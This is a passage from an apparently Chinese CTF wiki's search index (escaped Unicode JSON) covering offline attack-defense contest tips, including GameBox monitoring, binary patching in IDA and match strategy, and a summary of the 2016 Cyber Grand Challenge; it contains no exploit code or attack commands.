\u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002\n\n\n\n\nWarning\n\n\n\u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002\n\n\n\n\n\u670d\u52a1 patch \u4e0e\u9632\u5fa1\n\n\n\n\n\u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002\n\n\n\u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684\n    patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002\n\n\n\u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002\n\n\n\u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002\n\n\n\n\n\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb\n\n\n\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002\n\n\n\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565\n\n\n\n\n\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \n\u7b80\u5355\u9898\n \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002\n\n\n\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002\n\n\n\u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002\n\n\n\u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002\n\n\n\u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002", 
            "title": "\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3"
        }, 
        {
            "location": "/introduction/experience/#gamebox", 
            "text": "\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002  \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a   \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002  \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down\n    \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002  \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002  \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002   \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002   \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb  \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002", 
            "title": "\u5173\u6ce8 Gamebox \u72b6\u6001"
        }, 
        {
            "location": "/introduction/experience/#_1", 
            "text": "\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002  \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002   Warning  \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002", 
            "title": "\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3"
        }, 
        {
            "location": "/introduction/experience/#patch", 
            "text": "\u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002  \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684\n    patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002  \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002  \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002", 
            "title": "\u670d\u52a1 patch \u4e0e\u9632\u5fa1"
        }, 
        {
            "location": "/introduction/experience/#_2", 
            "text": "\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002", 
            "title": "\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb"
        }, 
        {
            "location": "/introduction/experience/#_3", 
            "text": "\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece  \u7b80\u5355\u9898  \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002  \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002  \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002  \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002  \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002", 
            "title": "\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565"
        }, 
        {
            "location": "/introduction/cgc/", 
            "text": "\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002\n\n\n\n\nCGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort\n\u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002\n\n\n\u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002\n\n\n\u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002\n\n\n\u6027\u80fd\u8bc4\u4ef7\u6307\u6807\n\n\n\n\n\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b\n\n\n\u6253\u8865\u4e01\u9891\u7387\uff1b\n\n\n\u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b\n\n\n\u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b\n\n\n\u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002\n\n\n\n\n\u660e\u786e\u6838\u5fc3\u4efb\u52a1\n\n\n\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002\n\n\n\u5206\u6790\u65b9\u6cd5\n\n\n\n\n\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b\n\n\n\u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b\n\n\n\u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002\n\n\n\n\nCGC \u7ecf\u9a8c\u603b\u7ed3\n\n\n\n\n\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b\n\n\n\u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b\n\n\n\u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b\n\n\n\u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002", 
            "title": "CGC \u8d85\u7ea7\u6311\u6218\u8d5b"
        }, 
        {
            "location": "/introduction/cgc/#_1", 
            "text": "\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b  \u6253\u8865\u4e01\u9891\u7387\uff1b  \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b  \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b  \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002", 
            "title": "\u6027\u80fd\u8bc4\u4ef7\u6307\u6807"
        }, 
        {
            "location": "/introduction/cgc/#_2", 
            "text": "\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002", 
            "title": "\u660e\u786e\u6838\u5fc3\u4efb\u52a1"
        }, 
        {
            "location": "/introduction/cgc/#_3", 
            "text": "\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b  \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b  \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002", 
            "title": "\u5206\u6790\u65b9\u6cd5"
        }, 
        {
            "location": "/introduction/cgc/#cgc", 
